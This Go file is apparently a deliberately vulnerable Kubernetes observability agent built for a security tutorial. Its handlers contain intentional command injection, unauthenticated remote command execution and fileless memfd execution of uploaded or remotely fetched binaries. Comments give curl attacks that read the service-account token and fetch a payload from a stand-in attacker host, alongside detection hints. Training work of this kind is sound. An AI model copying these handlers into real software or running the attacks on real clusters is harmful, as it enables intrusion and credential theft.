package main

// handlers.go — HTTP handlers for the Ooopservability agent.
//
// Each handler is annotated with the vulnerability class and
// the attack vector a student should discover in the tutorial.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
)

// ---------------------------------------------------------------------------
// /api/v1/metrics
// ---------------------------------------------------------------------------
// Proxies the kubelet /metrics endpoint through the Kubernetes API server
// using the nodes/proxy sub-resource.  The service account only needs:
//   GET nodes/proxy
// which looks harmless for a read-only observability tool — but it opens the
// entire unauthenticated kubelet HTTP API to the pod.

func handleMetrics(w http.ResponseWriter, r *http.Request) {
	node := envOr("NODE_NAME", "")
	if node == "" {
		jsonErr(w, http.StatusServiceUnavailable, "NODE_NAME not set — are you running inside a pod?")
		return
	}

	body, err := kubeletProxy(node, "metrics")
	if err != nil {
		jsonErr(w, http.StatusBadGateway, err.Error())
		return
	}

	w.Header().Set("Content-Type", "text/plain; version=0.0.4")
	_, _ = w.Write(body)
}

// ---------------------------------------------------------------------------
// /api/v1/nodes
// ---------------------------------------------------------------------------
// Fetches live kubelet /pods for this node via nodes/proxy.
//
// ATTACK: after exploiting RCE below, an attacker can call this directly:
//   curl http://localhost:8080/api/v1/nodes
// to enumerate every pod running on the node — namespace, image, env vars.

func handleNodes(w http.ResponseWriter, r *http.Request) {
	node := envOr("NODE_NAME", "")
	if node == "" {
		jsonErr(w, http.StatusServiceUnavailable, "NODE_NAME not set")
		return
	}

	body, err := kubeletProxy(node, "pods")
	if err != nil {
		jsonErr(w, http.StatusBadGateway, err.Error())
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write(body)
}

// ---------------------------------------------------------------------------
// /api/v1/logs/search  — VULN[BASIC]: Command Injection
// ---------------------------------------------------------------------------
// Intended use: search container logs on the node.
// Query parameter `q` is passed unsanitised into a shell command.
//
// ATTACK (basic):
//   curl 'http://agent:8080/api/v1/logs/search?q=error'
//   curl 'http://agent:8080/api/v1/logs/search?q=error;+id'
//   curl 'http://agent:8080/api/v1/logs/search?q=x;+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'
//
// The shell metacharacters are never stripped, so anything after `;` executes
// in the same shell context as the agent process.

func handleLogSearch(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query().Get("q")
	if query == "" {
		jsonErr(w, http.StatusBadRequest, "missing query param: q")
		return
	}

	// VULN[BASIC]: direct shell interpolation — no sanitisation
	shell := "grep -r " + query + " /var/log/ 2>&1 | head -200"
	out, _ := exec.Command("sh", "-c", shell).CombinedOutput() //nolint:gosec

	jsonOK(w, map[string]any{
		"query":  query,
		"output": string(out),
	})
}

// ---------------------------------------------------------------------------
// /api/v1/diagnostics/run  — VULN[BASIC]: Unauthenticated RCE
// ---------------------------------------------------------------------------
// Intended use: run a pre-approved diagnostic script.
// Reality: executes any command as the agent's service account user.
//
// ATTACK:
//   curl -X POST http://agent:8080/api/v1/diagnostics/run \
//        -H 'Content-Type: application/json' \
//        -d '{"command":"id && cat /proc/1/environ"}'
//
// From here an attacker can:
//   1. Read the SA token: cat /var/run/secrets/kubernetes.io/serviceaccount/token
//   2. Use the token + nodes/proxy to reach the kubelet API
//   3. Exec into any container on the node via:
//      POST /api/v1/nodes/<node>/proxy/run/<ns>/<pod>/<container>

func handleExec(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, http.StatusMethodNotAllowed, "POST required")
		return
	}

	var req struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Command == "" {
		jsonErr(w, http.StatusBadRequest, "body must be JSON: {\"command\":\"...\"}")
		return
	}

	// VULN[BASIC]: executes arbitrary commands with no authentication or authorisation
	out, _ := exec.Command("sh", "-c", req.Command).CombinedOutput() //nolint:gosec

	jsonOK(w, map[string]any{
		"command": req.Command,
		"output":  string(out),
	})
}

// ---------------------------------------------------------------------------
// /api/v1/diagnostics/upload  — VULN[ADVANCED]: Fileless Execution
// ---------------------------------------------------------------------------
// Intended use: upload a diagnostic script bundle.
// Reality: writes a binary to an anonymous in-memory file descriptor using
// memfd_create(2) and executes it directly from /proc/self/fd/<n>.
//
// The binary never touches the filesystem — no file creation events,
// no inode on disk.  Only eBPF-based runtime security (Falco, Tetragon,
// Cilium) watching execve() syscalls will catch this.
//
// ATTACK:
//   # Build or grab the demo payload
//   GOOS=linux GOARCH=amd64 go build -o payload ./payload
//
//   # Upload and execute
//   curl -X POST http://agent:8080/api/v1/diagnostics/upload \
//        --data-binary @payload \
//        -H 'Content-Type: application/octet-stream'
//
// Detection hint:
//   Falco rule: execve where fd.name startswith "/proc/self/fd/"
//   Tetragon:   process_exec where binary == "memfd:..."

func handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, http.StatusMethodNotAllowed, "POST required")
		return
	}

	// Read up to 50 MiB
	data, err := io.ReadAll(io.LimitReader(r.Body, 50<<20))
	if err != nil || len(data) == 0 {
		jsonErr(w, http.StatusBadRequest, "empty or unreadable body")
		return
	}

	// args may be supplied as query params: ?args=--flag+value
	args := r.URL.Query()["args"]

	var stdout, stderr bytes.Buffer
	if err := execFileless(data, args, &stdout, &stderr); err != nil {
		jsonOK(w, map[string]any{
			"error":  err.Error(),
			"stdout": stdout.String(),
			"stderr": stderr.String(),
		})
		return
	}

	jsonOK(w, map[string]any{
		"stdout": stdout.String(),
		"stderr": stderr.String(),
	})
}

// ---------------------------------------------------------------------------
// /api/v1/plugins/update  — VULN[ADVANCED]: RCE + Fileless Execution
// ---------------------------------------------------------------------------
// Intended use: hot-reload an observability plugin from a trusted registry.
// Reality: fetches an arbitrary binary from any URL and executes it entirely
// in memory via memfd_create — nothing is written to disk.
//
// On the surface this looks like a standard plugin management endpoint that
// any observability platform might expose. An attacker who discovers it can
// point it at their own server to download and run a payload filelessly.
//
// ATTACK:
//   # Host a payload on an attacker-controlled server
//   python3 -m http.server 9999 &
//
//   curl -X POST http://agent:8080/api/v1/plugins/update \
//        -H 'Content-Type: application/json' \
//        -d '{"registry":"http://attacker:9999/payload"}'
//
// Detection hints:
//   - Outbound HTTP from the pod to an unexpected destination (NetworkPolicy)
//   - execve where fd.name starts with "/proc/self/fd/" (Falco / Tetragon)
//   - DNS resolution to a non-cluster domain from a DaemonSet pod

func handlePluginUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, http.StatusMethodNotAllowed, "POST required")
		return
	}

	var req struct {
		Registry string   `json:"registry"`
		Args     []string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Registry == "" {
		jsonErr(w, http.StatusBadRequest, `body must be JSON: {"registry":"https://..."}`)
		return
	}

	// VULN[ADVANCED]: fetch arbitrary binary from attacker-controlled URL
	// using the insecure (TLS-skipping) HTTP client
	resp, err := insecureHTTPClient().Get(req.Registry) //nolint:gosec
	if err != nil {
		jsonErr(w, http.StatusBadGateway, fmt.Sprintf("fetch failed: %v", err))
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		jsonErr(w, http.StatusBadGateway, fmt.Sprintf("fetch returned HTTP %d", resp.StatusCode))
		return
	}

	// Read up to 50 MiB — same limit as the upload endpoint
	data, err := io.ReadAll(io.LimitReader(resp.Body, 50<<20))
	if err != nil || len(data) == 0 {
		jsonErr(w, http.StatusBadGateway, "empty or unreadable response body")
		return
	}

	// Execute filelessly via memfd_create — binary never touches disk
	var stdout, stderr bytes.Buffer
	if err := execFileless(data, req.Args, &stdout, &stderr); err != nil {
		jsonOK(w, map[string]any{
			"error":  err.Error(),
			"stdout": stdout.String(),
			"stderr": stderr.String(),
		})
		return
	}

	jsonOK(w, map[string]any{
		"stdout": stdout.String(),
		"stderr": stderr.String(),
	})
}
